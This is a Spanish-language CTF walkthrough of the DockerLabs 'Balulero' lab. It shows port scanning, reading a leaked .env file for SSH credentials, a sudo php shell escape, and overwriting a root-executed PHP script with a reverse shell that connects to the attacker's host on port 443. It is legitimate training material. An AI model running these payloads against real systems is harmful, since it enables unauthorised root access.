@@ -1,0 +1,227 @@
+---
+title: Balulero
+description: Resolución completa de la máquina virtual *Balulero* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Balulero**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web que contiene archivos JavaScript accesibles que referencian un archivo de entorno `.env_de_baluchingo`. Al acceder a este archivo, se obtienen credenciales en texto plano que permiten el acceso SSH al sistema como el usuario `balu`.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `php` como el usuario `chocolate` sin autenticación. Tras obtener acceso como `chocolate`, se descubre que el archivo `/opt/script.php` es ejecutado por `root` y es escribible por `chocolate`, permitiendo la inyección de una reverse shell que otorga acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Balulero',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '28/09/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Balulero.zip
+sudo bash auto_deploy.sh Balulero.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1761717544/Ip_kdnyha.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Balulero/{content,exploits,nmap,scripts}
+cd Balulero
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1761723760/Ports_kqgeqv.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1761723760/Index_z9rz3q.png)
+
+**Rutas identificadas:**
+- `/index` — Página principal (landing).
+- `/script.js` — Código JavaScript del frontend expuesto.
+- `/imagenes.js` — Recursos JavaScript expuestos.
+- `/whoami` — Directorio o endpoint con permisos de lectura.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Revisión de código expuesto
+
+Al inspeccionar los archivos JavaScript encontrados (`/script.js`), se detecta una referencia a un archivo de entorno: `.env_de_baluchingo`.
+
+![Info leaked](https://res.cloudinary.com/dewqswzke/image/upload/v1761723760/Info_qxj8sh.png)
+
+### 2.2 Lectura del archivo `.env` expuesto
+
+Se accede al archivo de entorno y se obtienen credenciales en texto plano:
+
+```bash
+curl http://172.17.0.2/.env_de_baluchingo
+```
+
+![Env leaked](https://res.cloudinary.com/dewqswzke/image/upload/v1761723759/Env_u1hafi.png)
+
+### 2.3 Acceso SSH
+
+Con las credenciales obtenidas, se prueba acceso SSH:
+
+```bash
+ssh balu@172.17.0.2
+```
+
+![SSH login](https://res.cloudinary.com/dewqswzke/image/upload/v1761723763/Ssh_ckbwla.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De balu → chocolate
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1761723764/Sudo-l_kmro3d.png)
+
+El usuario `balu` puede ejecutar `php` como `chocolate` sin contraseña.
+
+Se ejecuta `php` para obtener una shell como `chocolate`:
+
+```bash
+sudo -u chocolate php -r "system('/bin/bash');"
+```
+
+![Chocolate login](https://res.cloudinary.com/dewqswzke/image/upload/v1761723759/Chocolate_ecwnxr.png)
+
+### 3.2 De chocolate → root
+
+Desde la cuenta `chocolate`, se listan procesos y se observa que existe un proceso que ejecuta `/opt/script.php` como `root`:
+
+```bash
+ps aux
+```
+
+![Ps aux](https://res.cloudinary.com/dewqswzke/image/upload/v1761723761/psAux_epslfe.png)
+
+Se verifican los permisos del archivo `/opt/script.php`:
+
+```bash
+ls -l /opt/script.php
+```
+
+El archivo es ejecutado por `root` y es escribible por `chocolate`.
+
+Se modifica `script.php` para inyectar una reverse shell:
+
+```bash
+echo '<?php $sock=fsockopen("172.17.0.1",443);exec("bash -i <&3 >&3 2>&3"); ?>' > /opt/script.php
+```
+
+Se inicia un listener en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+Tras esperar a que el proceso root ejecute el script, se recibe la conexión con privilegios de `root`.
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761723762/Root_qgzl6a.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Exposición de archivos JavaScript con referencias sensibles",
+      severity: "Media",
+      impact: "Revelación de ubicación de archivos de configuración"
+    },
+    {
+      vulnerability: "Archivo .env accesible públicamente con credenciales en texto plano",
+      severity: "Crítica",
+      impact: "Compromiso de acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en php",
+      severity: "Alta",
+      impact: "Escalada de privilegios al usuario chocolate"
+    },
+    {
+      vulnerability: "Archivo ejecutado por root y escribible por usuario no privilegiado",
+      severity: "Crítica",
+      impact: "Ejecución de código arbitrario con privilegios de root"
+    },
+    {
+      vulnerability: "Falta de restricciones en procesos críticos",
+      severity: "Alta",
+      impact: "Modificación de scripts ejecutados por root"
+    }
+  ]}
+/>
